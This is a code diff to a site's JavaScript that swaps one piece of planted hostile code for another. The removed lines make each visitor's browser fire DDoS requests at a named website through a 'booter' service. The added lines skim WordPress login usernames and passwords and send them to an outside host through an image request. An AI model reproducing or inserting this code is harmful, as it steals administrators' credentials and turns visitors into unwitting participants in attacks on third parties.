@@ -1,29 +1,5 @@
-if (location.hostname.indexOf("kronosbooter.com") >= 0) {
-setInterval(function(){ location.reload(); }, 1000 * 60);
+if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
+document.getElementById('wp-submit').onclick = function() {
+   new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
+};
 }
-function saldir(url,time) {
-	var xhr = new XMLHttpRequest();
-	var params = {
-		targetinput: url,
-		methodselector: "jshttpget",
-		postdatainput: "",
-		seconds: time,
-		portinput: "80",
-		basiccaptcha: document.getElementsByName('basiccaptcha')[0].value
-	}
-	xhr.open("POST", "https://kronosbooter.com/boot.php", true);
-	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	xhr.onreadystatechange = function() {
-		if (xhr.readyState == 4 && xhr.status == 200) {
-			xhr.close;
-		}
-	}
-	xhr.send(deSerialize(params));
-}
-
-function deSerialize(json) {
-	return Object.keys(json).map(function(key) {
-		return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
-	}).join('&');
-}
-saldir("http://www.escort-girls.tv/",300);
